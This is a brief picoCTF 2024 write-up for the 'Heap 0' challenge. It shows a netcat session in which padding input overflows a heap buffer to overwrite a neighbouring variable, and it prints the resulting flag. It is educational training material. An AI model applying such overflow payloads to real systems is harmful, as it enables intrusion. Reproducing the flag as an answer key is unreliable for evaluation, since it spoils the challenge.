# Heap 0
- Difficulty: Easy
- Category: `Binary Exploitation`  
- Date: 2024-09-10  
tags: `picoCTF 2024` `browser_webshell_solvable` `heap`  
refer to [Source]()

## Solution
``` shell
$ nc tethys.picoctf.net 65145
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5ace2d14e2b0  ->   pico
+-------------+----------------+
[*]   0x5ace2d14e2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
```
``` shell
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
```
``` shell
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5ace2d14e2b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
+-------------+----------------+
[*]   0x5ace2d14e2d0  ->   pico
+-------------+----------------+
```
```shell
Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_76775c7c}
```

``` plain
picoCTF{my_first_heap_overflow_76775c7c}
```

### Improving
